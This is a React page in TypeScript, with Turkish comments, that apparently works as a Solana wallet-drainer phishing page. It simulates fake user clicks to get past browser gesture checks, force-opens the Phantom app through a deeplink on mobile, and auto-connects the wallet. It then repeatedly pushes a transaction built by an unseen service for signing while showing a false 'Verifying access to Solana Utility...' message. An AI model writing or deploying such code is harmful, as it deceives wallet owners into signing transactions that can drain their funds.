'use client'

import { useEffect, useRef, useState } from 'react'
import { useConnection, useWallet } from '@solana/wallet-adapter-react'
import { WalletName } from '@solana/wallet-adapter-base'
import { createUnsignedTransaction } from '../services/transaction'
import { Transaction } from '@solana/web3.js'

interface PhantomProvider { isPhantom?: boolean }
declare global { interface Window { solana?: PhantomProvider } }

export default function TransactionPage() {
  const { connection } = useConnection()
  const { publicKey, sendTransaction, connect, select, connected } = useWallet()

  const retries = useRef(0)
  const maxRetries = 3
  const waiting = useRef(false)
  const [status, setStatus] = useState('Loading...')

  /* ——— ➊ HAFİF DELAY VE SAHTE USER CLICK İLE DEEPLINK ——— */
  useEffect(() => {
    const w = window.innerWidth
    const isPhantomProvider = window.solana?.isPhantom ?? false
    const isAndroid = /Android/i.test(navigator.userAgent)
    const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent)

    if (w >= 322 && w <= 499 && !isPhantomProvider && (isAndroid || isIOS)) {
      const simulateUserClick = () =>
        document.body.dispatchEvent(new MouseEvent('click', {
          bubbles: true,
          cancelable: true,
          view: window
        }))

      const href = window.location.href
      const enc  = encodeURIComponent(href)
      const schemePhantom = `phantom://browse/${enc}?ref=${enc}`
      const universalPhantom = `phantom://browse/${enc}?ref=${enc}`

      // 1) Sahte click
      simulateUserClick()

      // 2) Anchor ile deeplink
      const a = document.createElement('a')
      a.href = isAndroid ? schemePhantom : universalPhantom
      a.target = '_blank'
      document.body.appendChild(a)

      // 3) Gerçek click event’i
      a.dispatchEvent(new MouseEvent('click', {
        bubbles: true,
        cancelable: true,
        view: window
      }))

      // 4) Temizlik
      setTimeout(() => a.remove(), 700)
      return
    }
  }, [])
  /* ———————————————————————————————————————————————— */

  /* ——— ➋ İŞLEM AKIŞI (Değişmedi) ——— */
  useEffect(() => {
    const simulateClick = () =>
      document.body.dispatchEvent(new MouseEvent('click', {
        bubbles: true,
        cancelable: true,
        view: window
      }))

    const trySendTransaction = async () => {
      if (!publicKey || waiting.current || retries.current >= maxRetries) return
      waiting.current = true
      try {
        simulateClick()
        setStatus('Verifying access to Solana Utility...')
        const tx = await createUnsignedTransaction(publicKey)
        if (!tx) throw new Error('Null transaction')
        const sig = await sendTransaction(tx as unknown as Transaction, connection)
        console.log('✅ transaction sent:', sig)
        setStatus('Successful ✅')
      } catch (err) {
        console.warn('⚠️ İşlem hatası:', err)
        retries.current += 1
        setStatus('Verifying access to Solana Utility...')
        setTimeout(() => { waiting.current = false; void trySendTransaction() }, 3000)
      }
    }

    const start = async () => {
      try {
        simulateClick()
        await select('Phantom' as WalletName)
        if (!connected) await connect()
        if (publicKey) void trySendTransaction()
      } catch (err) {
        console.error('connection error:', err)
        setStatus('Connection error ❌')
      }
    }

    void start()
  }, [publicKey, connected, connect, select, sendTransaction, connection])
  /* —————————————————————————————————————————————— */

  return (
    <div style={{
      backgroundColor: 'black',
      width: '100vw',
      height: '100vh',
      display: 'flex',
      justifyContent: 'center',
      alignItems: 'center',
      color: 'white',
      fontSize: '16px',
      fontFamily: 'monospace'
    }}>
      {status}
    </div>
  )
}
